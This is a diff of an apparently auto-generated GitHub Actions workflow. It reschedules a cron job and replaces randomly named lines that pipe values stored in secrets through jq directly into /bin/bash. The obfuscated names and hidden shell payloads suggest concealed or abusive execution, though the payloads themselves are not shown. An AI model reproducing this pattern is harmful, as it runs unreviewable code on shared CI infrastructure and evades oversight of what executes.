@@ -2,8 +2,8 @@ name: youngroundyy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
-jobs:  # 9644
+    - cron: '9 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +11,15 @@ jobs:  # 9644
       - uses: actions/checkout@v4
       - name: youngroundyy
         env:
-          ctpua612: ${{ secrets.ctpua612 }}
+          q5: ${{ secrets.q5 }}
         run: |
-          echo $ctpua612 | jq -r .gqeq064 | /bin/bash
-          echo $utqtr577 | jq -r .dzjv3 | /bin/bash
-          echo $n6319 | jq -r .yxpev53683 | /bin/bash
-          echo $znb1 | jq -r .is847 | /bin/bash
-          echo $odxwv71891 | jq -r .v1 | /bin/bash
-          echo $qimkx7567 | jq -r .zqw12 | /bin/bash
-          echo $lrct582 | jq -r .hmrlp55 | /bin/bash
-          echo $qtj33 | jq -r .omx9997 | /bin/bash
-          echo $lmf4031 | jq -r .cviw831 | /bin/bash
-          echo $h01163 | jq -r .ezl59902 | /bin/bash
-          echo $sswmo089 | jq -r .zbymx432 | /bin/bash
+          echo $q5 | jq -r .ix50042 | /bin/bash
+          echo $uu9 | jq -r .kp73 | /bin/bash
+          echo $v82555 | jq -r .dthch75256 | /bin/bash
+          echo $ho0 | jq -r .vjgi3 | /bin/bash
+          echo $euo4475 | jq -r .fpg49952 | /bin/bash
+          echo $yittm84 | jq -r .fxtxv5290 | /bin/bash
+          echo $y8 | jq -r .hb3425 | /bin/bash
+          echo $agyw8871 | jq -r .owqfz3310 | /bin/bash
+          echo $e15470 | jq -r .evsp4352 | /bin/bash
 
